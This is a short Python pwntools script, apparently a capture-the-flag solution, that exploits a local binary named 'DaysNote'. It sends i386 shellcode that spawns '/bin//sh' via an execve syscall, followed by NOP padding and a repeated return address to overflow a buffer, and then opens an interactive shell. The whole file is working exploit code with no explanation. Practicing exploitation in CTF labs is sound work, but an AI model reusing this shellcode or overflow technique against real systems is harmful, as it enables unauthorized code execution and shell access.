from pwn import *

#context.log_level='debug'


for i in range(1):
	s=process('./DaysNote')

	raw_input('1')
	shellcode='\x31\xc0\x31\xdb\x31\xc9\x31\xd2'
	shellcode+='\x50\x68\x2f\x2f\x73\x68'
	shellcode+='\x68\x2f\x62\x69\x6e'
	shellcode+='\x8b\xdc'
	shellcode+='\x50\x53'
	shellcode+='\x8b\xcc'
	shellcode+='\xb0\x3b'
	shellcode+='\x2c\x30'
	shellcode+='\xcd\x80'

	print len(shellcode)
	s.recvuntil('Year : ')
	s.sendline('0')

	s.recvuntil('Write : ')

	s.sendline(shellcode+'\x90'*2+p32(0x0804857f)*((0x16d-len(shellcode)-0x10)/4))

	s.interactive()


